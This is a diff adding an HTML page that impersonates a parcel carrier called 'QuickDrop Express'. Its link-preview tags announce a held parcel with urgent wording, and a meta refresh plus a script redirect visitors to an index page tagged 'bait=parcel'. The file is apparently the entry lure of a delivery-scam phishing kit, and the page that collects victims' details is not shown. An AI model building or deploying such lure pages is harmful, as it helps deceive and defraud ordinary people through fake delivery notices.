@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>QuickDrop Express | Delivery Action Required</title>
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="📦 QuickDrop Parcel #QD-8841 (Delivery Held)" />
+  <meta property="og:description" content="Your express parcel could not be dropped off. Confirm delivery window to avoid return." />
+  <meta name="theme-color" content="#f59e0b" />
+  <meta http-equiv="refresh" content="0; url=./index.html?bait=parcel" />
+</head>
+<body style="background:#0b0d12;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
+  <p>Loading tracking...</p>
+  <script>
+    const p = new URLSearchParams(window.location.search);
+    if (!p.has('bait')) p.set('bait', 'parcel');
+    window.location.replace('./index.html?' + p.toString());
+  </script>
+</body>
+</html>
